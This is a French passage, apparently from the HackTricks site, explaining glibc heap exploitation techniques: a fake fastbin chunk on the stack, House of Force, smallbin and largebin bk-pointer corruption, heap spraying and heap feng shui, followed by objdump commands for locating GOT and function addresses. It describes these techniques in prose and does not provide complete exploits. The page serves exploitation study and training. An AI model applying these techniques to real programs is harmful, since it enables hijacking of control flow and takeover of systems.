Dans ce cas, nous cherchons √† avoir un pointeur vers un malloc qui peut √™tre modifi√© par l'attaquant (par exemple, le pointeur est sur la pile sous un possible d√©passement de capacit√© d'une variable).

Ainsi, nous pourrions faire pointer ce pointeur o√π nous voulons. Cependant, tous les emplacements ne sont pas valides, la taille du morceau falsifi√© doit √™tre inf√©rieure √† av->max\_fast et plus pr√©cis√©ment √©gale √† la taille demand√©e lors d'un futur appel √† malloc()+8. Par cons√©quent, si nous savons qu'apr√®s ce pointeur vuln√©rable, malloc(40) est appel√©, la taille du faux morceau doit √™tre de 48.
Si, par exemple, le programme demande √† l'utilisateur un nombre, nous pourrions entrer 48 et pointer le pointeur de malloc modifiable vers les 4 octets suivants (qui pourraient appartenir √† EBP avec un peu de chance, de sorte que 48 soit en arri√®re, comme s'il s'agissait de l'en-t√™te size). De plus, l'adresse ptr-4+48 doit satisfaire plusieurs conditions (dans ce cas, ptr=EBP), c'est-√†-dire 8 < ptr-4+48 < av->system_mem.

Si cela est vrai, lorsque le prochain malloc est appel√©, qui √©tait malloc(40), il se verra attribuer l'adresse de EBP. Si l'attaquant peut √©galement contr√¥ler ce qui est √©crit dans ce malloc, il peut √©craser √† la fois EBP et EIP avec l'adresse de son choix.

Je pense que c'est parce que lorsque free() est appel√©, il enregistre que l'adresse point√©e par EBP de la pile contient un morceau de taille parfaite pour le nouveau malloc() √† r√©server, il lui attribue donc cette adresse.

**La Maison de la Force**

Il est n√©cessaire de :

* Un d√©passement de m√©moire sur un morceau qui permet de modifier le wilderness
* Un appel √† malloc() avec une taille d√©finie par l'utilisateur
* Un appel √† malloc() dont les donn√©es peuvent √™tre d√©finies par l'utilisateur

La premi√®re chose √† faire est de modifier la taille du morceau wilderness avec une valeur tr√®s grande (0xffffffff), de sorte que toute demande de m√©moire suffisamment grande soit trait√©e dans \_int\_malloc() sans avoir besoin d'√©tendre le tas.

La deuxi√®me chose est de modifier av->top pour qu'il pointe vers une zone m√©moire sous le contr√¥le de l'attaquant, comme la pile. Dans av->top, on met \&EIP - 8.

Nous devons modifier av->top pour qu'il pointe vers la zone m√©moire sous le contr√¥le de l'attaquant :

victim = av->top;

remainder = chunck_at_offset(victim, nb);

av->top = remainder;

Victim r√©cup√®re la valeur de l'adresse du morceau wilderness actuel (l'actuel av->top) et remainder est exactement la somme de cette adresse plus la quantit√© d'octets demand√©e par malloc(). Donc, si \&EIP-8 est √† 0xbffff224 et av->top contient 0x080c2788, alors la quantit√© que nous devons r√©server dans le malloc contr√¥l√© pour que av->top pointe vers $EIP-8 pour le prochain malloc() sera :

0xbffff224 - 0x080c2788 = 3086207644.

Ainsi, la valeur modifi√©e sera enregistr√©e dans av->top et le prochain malloc pointera vers EIP et pourra l'√©craser.

Il est important de savoir que la taille du nouveau morceau wilderness doit √™tre plus grande que la demande faite par le dernier malloc(). C'est-√†-dire, si le wilderness pointe vers \&EIP-8, la taille sera juste dans le champ EBP de la pile.

**La Maison de la Connaissance**

**Corruption de SmallBin**

Les morceaux lib√©r√©s sont plac√©s dans le bin en fonction de leur taille. Mais avant d'√™tre plac√©s, ils sont stock√©s dans unsorted bins. Lorsqu'un morceau est lib√©r√©, il n'est pas imm√©diatement plac√© dans son bin, mais reste dans unsorted bins. Ensuite, s'il y a une nouvelle demande de m√©moire et que le morceau pr√©c√©demment lib√©r√© peut √™tre utilis√©, il est renvoy√©, mais s'il y a une demande de taille sup√©rieure, le morceau lib√©r√© dans unsorted bins est plac√© dans son bin appropri√©.

Pour atteindre le code vuln√©rable, la demande de m√©moire doit √™tre sup√©rieure √† av->max_fast (g√©n√©ralement 72) et inf√©rieure √† MIN_LARGE_SIZE (512).

Si un morceau de la taille demand√©e est pr√©sent dans le bin, il est renvoy√© apr√®s avoir √©t√© d√©tach√© :

bck = victim->bk; Pointe vers le morceau pr√©c√©dent, c'est la seule information que nous pouvons modifier.

bin->bk = bck; L'avant-dernier morceau devient le dernier, au cas o√π bck pointe vers la pile, le morceau suivant r√©serv√© recevra cette adresse.

bck->fd = bin; La liste est ferm√©e en faisant pointer celle-ci vers bin.

Il est n√©cessaire de :

R√©servation de deux malloc, de sorte que le premier puisse √™tre d√©bord√© apr√®s que le second ait √©t√© lib√©r√© et plac√© dans son bin (c'est-√†-dire, un malloc plus grand que le deuxi√®me morceau est r√©serv√© avant le d√©bordement)

Le malloc r√©serv√© √† l'adresse choisie par l'attaquant doit √™tre contr√¥l√© par l'attaquant.

L'objectif est le suivant, si nous pouvons d√©border un tas qui a en dessous un morceau d√©j√† lib√©r√© et dans son bin, nous pouvons modifier son pointeur bk. Si nous modifions son pointeur bk et que ce morceau devient le premier de la liste du bin et est r√©serv√©, nous tromperons le bin en lui disant que le dernier morceau de la liste (le suivant √† offrir) est √† l'adresse fausse que nous avons mise (comme la pile ou la GOT par exemple). Ainsi, si un autre morceau est r√©serv√© et que l'attaquant a des autorisations dessus, il recevra un morceau √† la position souhait√©e et pourra y √©crire.

Apr√®s avoir lib√©r√© le morceau modifi√©, il est n√©cessaire de r√©server un morceau plus grand que celui qui a √©t√© lib√©r√©, de sorte que le morceau modifi√© sorte des unsorted bins et soit plac√© dans son bin.

Une fois dans son bin, il est temps de modifier le pointeur bk en utilisant le d√©bordement pour qu'il pointe vers l'adresse que nous voulons √©craser.

Ainsi, le bin doit attendre que malloc() soit appel√© suffisamment de fois pour que le bin modifi√© soit utilis√© √† nouveau et trompe le bin en lui faisant croire que le prochain morceau est √† l'adresse fausse. Ensuite, le morceau qui nous int√©resse sera donn√©.

Pour que la vuln√©rabilit√© s'ex√©cute le plus t√¥t possible, l'id√©al serait : R√©servation du morceau vuln√©rable, r√©servation du morceau qui sera modifi√©, lib√©ration de ce morceau, r√©servation d'un morceau plus grand que celui qui sera modifi√©, modification du morceau (vuln√©rabilit√©), r√©servation d'un morceau de m√™me taille que le morceau viol√© et r√©servation d'un deuxi√®me morceau de m√™me taille qui pointera vers l'adresse choisie.

Pour prot√©ger cette attaque, la v√©rification typique que le morceau n'est pas faux est utilis√©e : on v√©rifie si bck->fd pointe vers victim. C'est-√†-dire, dans notre cas, si le pointeur fd* du faux morceau point√© dans la pile pointe vers victim. Pour contourner cette protection, l'attaquant devrait √™tre capable d'√©crire d'une mani√®re ou d'une autre (probablement sur la pile) dans l'adresse appropri√©e l'adresse de victim. Ainsi, cela ressemblera √† un vrai morceau.

**Corruption de LargeBin**

Les m√™mes exigences que pr√©c√©demment sont n√©cessaires, ainsi que d'autres, en plus les morceaux r√©serv√©s doivent √™tre sup√©rieurs √† 512.

L'attaque est similaire √† la pr√©c√©dente, c'est-√†-dire qu'il faut modifier le pointeur bk et toutes ces appels √† malloc(), mais en plus il faut modifier la taille du morceau modifi√© de telle sorte que size - nb soit < MINSIZE.

Par exemple, il faut mettre 1552 dans size pour que 1552 - 1544 = 8 < MINSIZE (la soustraction ne peut pas √™tre n√©gative car elle compare un unsigned)

De plus, un correctif a √©t√© ajout√© pour le rendre encore plus compliqu√©.

**Heap Spraying**
B√°sicamente, consiste en r√©server autant de m√©moire que possible pour les tas et les remplir avec un matelas de nops suivi d'un shellcode. De plus, le matelas utilis√© est 0x0c. On essaiera donc de sauter √† l'adresse 0x0c0c0c0c, de sorte que si une adresse √† laquelle on appelle avec ce matelas est √©cras√©e, on sautera l√†-bas. Fondamentalement, la tactique consiste √† r√©server autant que possible pour voir si un pointeur est √©cras√© et √† sauter √† 0x0c0c0c0c en esp√©rant qu'il y ait des nops l√†-bas.

**Heap Feng Shui**

Il consiste √† semer la m√©moire en r√©servant et en lib√©rant des morceaux de mani√®re √† ce qu'il reste des morceaux r√©serv√©s entre les morceaux libres. Le tampon √† d√©border sera plac√© dans l'un des espaces vides.

**objdump -d executable** ‚Äî> D√©sassembler les fonctions\
**objdump -d ./PROGRAMME | grep FONCTION** ‚Äî> Obtenir l'adresse de la fonction\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour v√©rifier que c'est bien notre shellcode et obtenir les opcodes\
**objdump -t ./exec | grep varBss** ‚Äî> Table des symboles, pour obtenir l'adresse des variables et des fonctions\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Pour obtenir l'adresse des fonctions de biblioth√®ques (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Obtenir l'adresse de puts √† √©craser dans le GOT\
**objdump -D ./exec** ‚Äî> D√©sassembler TOUT jusqu'aux entr√©es de la plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Informations sur la fonction dans gdb

## Cours int√©ressants

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **R√©f√©rences**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
